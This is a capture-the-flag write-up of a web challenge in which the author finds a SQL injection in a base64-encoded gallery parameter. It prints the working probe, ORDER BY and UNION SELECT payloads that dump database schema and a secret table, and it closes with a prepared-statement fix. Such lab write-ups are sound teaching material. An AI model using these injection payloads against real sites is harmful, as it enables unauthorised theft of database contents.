# Intigriti Challenge 0926 — Write-up: From XSS hunting to SQL Injection

> **Challenge:** https://challenge-0926.challenges.intigriti.io
> **Flag:** `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`
> **Solved on:** 22 September 2026 (day 2 of the challenge)

## Recon

The challenge app is **Critter Gallery** — a small PHP gallery of animals:

- Main page: rules + an `<iframe src="/challenge.php">` (same origin)
- `challenge.php` renders a grid of 8 animal tiles
- Each tile links to `?pic=<base64>` — e.g. `?pic=Zm94` decodes to `fox`

First look at the HTML source of a detail page:

```html
<h2>fox</h2>
<div class="desc">The red fox is a clever, highly adaptable hunter.<br></div>
```

Two immediate observations:

1. `<h2>` holds the decoded `pic` value, **HTML-escaped** (`<b>x</b>` → `&lt;b&gt;x&lt;/b&gt;`)
2. `.desc` renders **raw HTML** — the trailing `<br>` is a live DOM element

There was no JavaScript, no cookies, no hidden inputs — so the flag had to live
server-side. That shifted the hunt from classic XSS to server-side injection.

## Finding the injection

Since `pic` is base64, I URL-encoded `+` as `%2B` (otherwise PHP turns it into a space
and corrupts the payload). Then the classic probe:

```
?pic=Zm94JyBPUiAnMSc9JzE=        # base64 of: fox' OR '1'='1
```

Response — not one animal, but **multiple descriptions concatenated**:

```
The red fox is a clever, highly adaptable hunter.<br>Giant pandas spen...
```

The decoded value lands inside `WHERE name='...'` with no parameterization.
**SQL injection confirmed.**

## Column count

The injection point returns rows that the PHP loop renders as repeated blocks:

```
x' ORDER BY 1-- -    # page renders normally (empty result)
x' ORDER BY 2-- -    # page breaks — no detail section at all
```

So the query selects a **single column** — the animal name. The descriptions are read
per name from somewhere else (files), which explains why `OR '1'='1` produced multiple
`.desc` blocks.

## Enumerating the database (single-column UNION)

Because only one column is selected, every enumeration had to be squeezed through
one field:

```sql
x' UNION SELECT schema_name FROM information_schema.schemata-- -
```
→ `information_schema`, `performance_schema`, **`critter_gallery`**

```sql
x' UNION SELECT table_name FROM information_schema.tables-- -
```
→ `animals`, **`secret_vault`**, (system tables)

```sql
x' UNION SELECT column_name FROM information_schema.columns
  WHERE table_name='secret_vault'-- -
```
→ `id`, `note`

## The flag

```sql
x' UNION SELECT CONCAT(id, " | ", note) FROM critter_gallery.secret_vault-- -
```

URL-encoded and base64-wrapped:

```
?pic=eCcgVU5JT04gU0VMRUNUIENPTkNBVChpZCwgIiB8ICIsIG5vdGUpIEZST00gY3JpdHRlcl9nYWxsZXJ5LnNlY3JldF92YXVsdC0tIC0=
```

The `.desc` block answers:

```
1 | INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

Flag captured.

## Lessons

- **Escape analysis beats payload spraying.** Noticing that `<h2>` was escaped while
  `.desc` rendered raw HTML told me where *not* to waste time — and that the interesting
  logic was server-side, not client-side.
- **Base64 is encoding, not security.** The wrapper just adds one step; the classic
  `' OR '1'='1` still works — it just has to be shipped base64-encoded (and `+` must
  be `%2B` in the URL).
- **Broken rendering is a signal.** `ORDER BY 2` turning the page into a half-rendered
  response was a cleaner column-count oracle than any error message.
- **Single-column UNIONs still leak everything.** `CONCAT()` packs an entire row into
  the one field you control.

## Timeline

| Time | Step |
|---|---|
| ~0 min | Recon: iframe, pic param, base64, escaped h2 / raw desc |
| ~3 min | LFI/php://filter attempts — dead ends |
| ~5 min | `OR '1'='1` — multiple descriptions → SQLi |
| ~6 min | `ORDER BY` → 1 column; UNION schema walk → `secret_vault` |
| ~7 min | CONCAT extraction → flag |

## Fix

Use prepared statements for the name lookup; never concatenate the base64-decoded
user input into the SQL string.